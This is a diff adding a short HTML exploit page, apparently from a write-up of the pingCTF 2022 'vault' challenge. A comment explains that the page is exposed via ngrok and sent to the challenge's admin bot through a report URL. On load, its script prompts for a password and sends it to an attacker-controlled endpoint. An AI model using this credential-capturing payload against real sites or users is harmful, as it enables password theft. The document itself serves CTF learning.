@@ -1,0 +1,11 @@
+<!-- The malicious page above is hosted locally and ngrok is used to expose it to the public. The robot is directed to the page via http:/<challenge_addr>/report?url=http://<ngrok_addr>/test.html. After a few minutes, the vault password is obtained. -->
+<!-- https://abcdefghijlkmnopqrstuvw.xyz/writeups/pingctf2022/vault/ -->
+    <html>
+	<script>
+		window.addEventListener("load", async () => {
+			var password = prompt('Provide secret password:');
+			var test = await(await (fetch(`/api/get?password=${password}`)).text());
+		});
+	</script>
+Testing
+</html>
